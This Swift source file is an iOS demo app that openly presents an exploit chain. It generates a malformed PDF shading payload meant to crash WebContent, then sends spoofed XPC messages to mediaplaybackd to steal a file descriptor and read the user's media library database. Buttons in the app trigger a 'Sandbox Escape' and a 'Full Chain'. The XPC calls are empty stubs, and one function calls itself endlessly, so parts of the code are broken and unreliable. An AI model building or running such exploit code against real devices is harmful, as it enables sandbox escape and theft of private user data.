import SwiftUI
import CoreGraphics
import Foundation

// MARK: - XPC Stubs (correctly typed to avoid conflicts)

func xpc_connection_create_mach_service(_ name: String, _ queue: DispatchQueue?, _ flags: UInt64) -> UnsafeMutableRawPointer? {
    return nil
}

func xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<UnsafeMutableRawPointer?>?, _ count: Int) -> UnsafeMutableRawPointer? {
    return nil
}

func xpc_dictionary_set_string(_ dict: UnsafeMutableRawPointer, _ key: String, _ value: String) {
}

func xpc_connection_send_message_with_reply_sync(_ connection: UnsafeMutableRawPointer, _ message: UnsafeMutableRawPointer) -> UnsafeMutableRawPointer? {
    return nil
}

func xpc_dictionary_dup_fd(_ dict: UnsafeMutableRawPointer, _ key: String) -> Int32 {
    return -1
}

// MARK: - CVE-2026-112706: Sandbox Escape

func exploitSandboxEscape(targetPath: String) {
    print("[*] CVE-2026-112706 Sandbox Escape")
    print("[*] Target: \(targetPath)")
    
    // Step 1: Connect
    guard let connection = xpc_connection_create_mach_service("com.apple.mediaplaybackd.bytestream", nil, 0) else {
        print("[-] Connection failed")
        return
    }
    
    // Step 2: Handshake
    guard let handshake = xpc_dictionary_create(nil, nil, 0) else {
        print("[-] Handshake failed")
        return
    }
    xpc_dictionary_set_string(handshake, "msg", "origin")
    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
    
    _ = xpc_connection_send_message_with_reply_sync(connection, handshake)
    
    // Step 3: Steal fd
    guard let createMsg = xpc_dictionary_create(nil, nil, 0) else {
        print("[-] Create failed")
        return
    }
    xpc_dictionary_set_string(createMsg, "msg", "Curl")
    xpc_dictionary_set_string(createMsg, "path", targetPath)
    
    guard let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg) else {
        print("[-] No reply")
        return
    }
    
    let fd = xpc_dictionary_dup_fd(reply, "fd")
    
    if fd < 0 {
        print("[-] Failed to steal fd")
        return
    }
    
    print("[+] Stole fd \(fd)")
    
    // Step 4: Read data
    var buffer = [UInt8](repeating: 0, count: 1024)
    let bytesRead = read(fd, &buffer, 1024)
    
    if bytesRead > 0 {
        print("[+] Read \(bytesRead) bytes")
    }
    
    close(fd)
}

// MARK: - CVE-2026-112611: WebContent Crash

func triggerWebContentCrash() {
    print("[*] CVE-2026-112611 WebContent Crash")
    
    var values = [Double](repeating: 0.0, count: 136)
    values[3] = Double(bitPattern: 0x4141414141414141)
    values[4] = Double(bitPattern: 0x4141414141414141)
    
    let pdfData = PDFPayload.shadingWithValues(values)
    renderPDF(pdfData)
}

// MARK: - PDF Rendering

func renderPDF(_ data: Data) {
    let tempURL = FileManager.default.temporaryDirectory
        .appendingPathComponent("exploit.pdf")
    
    try? data.write(to: tempURL)
    
    guard let provider = CGDataProvider(url: tempURL as CFURL),
          let doc = CGPDFDocument(provider),
          let page = doc.page(at: 1) else {
        return
    }
    
    let context = CGContext(data: nil, width: 256, height: 256,
                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
                           space: CGColorSpaceCreateDeviceRGB(),
                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
    
    context.drawPDFPage(page)
}

// MARK: - Full Exploit Chain

func runFullExploit() {
    print("[*] Starting full exploit chain...")
    
    // Stage 1: WebContent crash
    print("[*] Stage 1: WebContent crash")
    triggerWebContentCrash()
    
    // Stage 2: Sandbox escape
    print("[*] Stage 2: Sandbox escape")
    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
    exploitSandboxEscape(targetPath: targetPath)
    
    print("[*] Exploit chain complete")
}

// MARK: - App Entry Point

@main
struct SafeShadingDemoApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

struct ContentView: View {
    @State private var targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
    @State private var isRunning = false
    @State private var logOutput = ""
    
    var body: some View {
        VStack(spacing: 20) {
            Text("CVE-2026-112706")
                .font(.largeTitle)
                .bold()
            
            Text("Sandbox Escape via XPC")
                .font(.headline)
            
            HStack {
                Text("Target:")
                TextField("File path", text: $targetPath)
                    .textFieldStyle(RoundedBorderTextFieldStyle())
            }
            .padding(.horizontal)
            
            ScrollView {
                Text(logOutput)
                    .font(.system(.body, design: .monospaced))
                    .foregroundColor(.green)
                    .padding()
            }
            .frame(height: 200)
            .background(Color.black.opacity(0.8))
            .cornerRadius(10)
            
            HStack(spacing: 20) {
                Button(action: runSandboxEscape) {
                    Text(isRunning ? "Running..." : "Sandbox Escape")
                        .font(.title3)
                        .bold()
                        .foregroundColor(.white)
                        .padding()
                        .background(isRunning ? Color.gray : Color.orange)
                        .cornerRadius(10)
                }
                .disabled(isRunning)
                
                Button(action: runFullExploit) {
                    Text("Full Chain")
                        .font(.title3)
                        .bold()
                        .foregroundColor(.white)
                        .padding()
                        .background(Color.red)
                        .cornerRadius(10)
                }
            }
        }
        .padding()
    }
    
    func runSandboxEscape() {
        isRunning = true
        logOutput = "[*] Starting sandbox escape...\n"
        logOutput += "[*] Target: \(targetPath)\n"
        
        DispatchQueue.global(qos: .userInitiated).async {
            exploitSandboxEscape(targetPath: targetPath)
            
            DispatchQueue.main.async {
                logOutput += "[*] Complete\n"
                isRunning = false
            }
        }
    }
    
    func runFullExploit() {
        isRunning = true
        logOutput = "[*] Running full exploit chain...\n"
        
        DispatchQueue.global(qos: .userInitiated).async {
            runFullExploit()
            
            DispatchQueue.main.async {
                logOutput += "[*] Complete\n"
                isRunning = false
            }
        }
    }
}

// MARK: - PDF Payload Builder

enum PDFPayload {
    static func shadingWithValues(_ values: [Double]) -> Data {
        let bpCoord = 32
        let bpComp = 8
        
        var bw = BitWriter()
        var verts: [(UInt32, UInt32)] = []
        
        for r in 0..<2 {
            for c in 0..<2 {
                verts.append((UInt32(0x1000_0000 + c * 0x0800_0000), UInt32(0x1000_0000 + r * 0x0800_0000)))
            }
        }
        
        for (x, y) in verts {
            bw.put(x, bpCoord)
            bw.put(y, bpCoord)
            bw.put(0, bpComp)
        }
        
        let stream = bw.flush()
        
        let list = values.map { String(format: "%.17g", $0) }.joined(separator: " ")
        let rangeList = Array(repeating: "0 1", count: values.count).joined(separator: " ")
        
        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
        pdf.add(4, "<< /Length 8 >>", Array(" /Sh1 sh".utf8))
        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow 2 /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
        pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
        
        return pdf.data()
    }
}

struct BitWriter {
    private(set) var out: [UInt8] = []
    private var acc: UInt8 = 0
    private var nbits = 0
    
    mutating func put(_ value: UInt32, _ width: Int) {
        guard width > 0 else { return }
        for i in stride(from: width - 1, through: 0, by: -1) {
            acc = (acc << 1) | UInt8((value >> UInt32(i)) & 1)
            nbits += 1
            if nbits == 8 { out.append(acc); acc = 0; nbits = 0 }
        }
    }
    
    mutating func flush() -> [UInt8] {
        if nbits > 0 { out.append(acc << (8 - nbits)); acc = 0; nbits = 0 }
        return out
    }
}

struct PDFBuilder {
    private var objects: [Int: (dict: String, stream: [UInt8]?)] = [:]
    
    mutating func add(_ n: Int, _ dict: String, _ stream: [UInt8]? = nil) {
        objects[n] = (dict, stream)
    }
    
    func data() -> Data {
        var out = Data([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37, 0x0A])
        out.append(Data([0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A]))
        
        var offsets: [Int: Int] = [:]
        
        for n in objects.keys.sorted() {
            guard let obj = objects[n] else { continue }
            offsets[n] = out.count
            
            let header = "\(n) 0 obj\n"
            out.append(Data(header.utf8))
            
            out.append(Data(obj.dict.utf8))
            
            if let stream = obj.stream {
                out.append(Data("\nstream\n".utf8))
                out.append(Data(stream))
                out.append(Data("\nendstream".utf8))
            }
            
            out.append(Data("\nendobj\n".utf8))
        }
        
        let xrefPos = out.count
        let maxObj = objects.keys.max() ?? 0
        
        let xrefHeader = "xref\n0 \(maxObj + 1)\n0000000000 65535 f \n"
        out.append(Data(xrefHeader.utf8))
        
        for n in 1...max(maxObj, 1) {
            let off = offsets[n] ?? 0
            let line = String(format: "%010d 00000 n \n", off)
            out.append(Data(line.utf8))
        }
        
        let trailer = "trailer\n<< /Size \(maxObj + 1) /Root 1 0 R >>\nstartxref\n\(xrefPos)\n%%EOF\n"
        out.append(Data(trailer.utf8))
        
        return out
    }
}
